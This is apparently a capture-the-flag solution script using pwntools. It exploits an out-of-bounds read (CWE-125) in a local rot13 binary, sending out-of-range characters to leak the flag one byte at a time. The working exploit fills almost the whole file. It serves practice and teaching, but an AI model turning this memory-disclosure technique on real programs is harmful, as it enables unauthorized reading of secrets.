from pwn import *
context.log_level='error'

"""
googling the hint CWE 125 shows cwe details page, this code is featured
// range of values for the array
if (index >= 0 && index < len) {

so with unsafe code, you can read before or after the buffer
can be done easily if you read loads of indexes or with less
whatever you want
"""
p = process("./a.out")
# p = remote("localhost",1234)

#just rot13 each character of the alphabet as an example of the program's use case
def simpleArrayEncode():
    for i in "abcdefghijklmnopqrstuvwxyz":
        p.sendline(i.encode())
        p.recvuntil("go: ")
        output = p.recv()
        print(output)

def solve_challenge():
    start=90
    flag=b""
    #flag is same length as alphabet
    for i in range(26):
        #read array[90-i]
        p.sendline(chr(start-i).encode())
        p.recvuntil(b"go: ")
        #get letter response
        output = p.recv(1)
        flag+=output
    #gimme the flag
    print(flag[::-1])

# simpleArrayEncode()
solve_challenge()